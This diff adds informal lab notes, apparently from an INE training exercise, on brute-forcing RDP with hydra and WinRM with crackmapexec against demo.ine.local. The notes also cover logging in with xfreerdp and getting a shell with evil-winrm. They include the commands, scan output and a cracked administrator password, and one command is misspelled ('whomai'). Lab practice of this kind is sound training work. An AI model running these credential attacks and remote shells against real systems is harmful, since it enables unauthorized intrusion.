@@ -9,3 +9,46 @@ Dictionaries to use:
 
 /usr/share/metasploit-framework/data/wordlists/common_users.txt
 /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
+
+rdp running in non-standard ports other than 3389 then using the msfconsole search for the rdp_scanner use it
+it will confirm whether the device is using rdp or not
+
+now bruteforce the rdp users and passwords   using hydra
+hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt rdp://demo.ine.local -s 3333
+
+to login with rdp here we use the xfreerdp to connect
+xfreerdp /u:administrator /p:qwertyuiop /v:domain:port #login
+boom logged in
+go and find flags
+
+
+exploiting winrm:
+winrm is windows remote management protocol used to faciliate the remote access with windows system over https
+
+winrm is used in following ways
+Remotely access and interact with windows hosts on a local network
+remotely access and executr commands on windows systems
+manage and configure windows systems remotely
+winrm uses port 5985 and 5986.
+we use crackmapexec to perform brute-force on winRm in order to users and there paswords
+we can also utilze a ruby script call evil-winrm to obtain a command shell
+
+
+nmap -sV -p 5985 demo.ine.local
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-03-04 14:04 IST
+Nmap scan report for demo.ine.local (10.3.17.136)
+Host is up (0.0033s latency).
+
+PORT     STATE SERVICE VERSION
+5985/tcp open  http    Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+crackmapexec winrm demo.ine.local -u administrator -p /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt 
+//to bruteforce
+[+] server\administrator:tinkerbell (Pwn3d!)
+
+crackmapexec winrm demo.ine.local -u administrator -p tinkerbell -x "whomai"
+"OR"
+evil-winrm -i demo.ine.local -u administrator -p 'tinkerbell'
+you will get the shell
+
